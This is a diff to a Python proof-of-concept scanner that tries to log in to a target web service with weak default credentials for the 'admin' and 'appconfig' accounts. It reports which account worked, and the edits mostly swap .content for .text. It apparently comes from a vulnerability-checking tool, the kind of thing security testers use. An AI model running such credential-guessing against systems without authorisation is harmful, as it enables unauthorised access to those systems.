@@ -52,25 +52,25 @@ def poc(target):
         # try logining with admin
         sess_adm = requests.Session()
         sess_adm.get(url=url, timeout=5)
-        adm = sess_adm.post(url=url, data=payload_admin, timeout=5)
+        adm = sess_adm.post(url=url, data=payload_admin, headers=headers, timeout=5)
         # succeed in login
-        if 'Hosts' in adm.content and 'admin' in adm.content:
+        if 'Hosts' in adm.text and 'admin' in adm.text:
             #  adm stand for admin weakpass
             return "[adm]"+base_url 
             
         # if first login failed
-        elif 'Invalid Login' in adm.content :
+        elif 'Invalid Login' in adm.text :
             # try logining with appconfig    
             sess_cfg = requests.Session()
             sess_cfg.get(url=url, timeout=5)
             cfg = sess_cfg.post(url=url, data=payload_appconfig, timeout=5)
             # second trial, if succeed
-            if 'Hosts' in cfg.content and 'appconfig' in cfg.content:
+            if 'Hosts' in cfg.text and 'appconfig' in cfg.text:
                 return "[cfg]"+base_url
                 #  cfg stand for appconfig weakpass
                 
             # Failed again, proving to be no vulns
-            elif 'Invalid Login' in cfg.content :
+            elif 'Invalid Login' in cfg.text :
                 return False
     # catch
     except Exception:
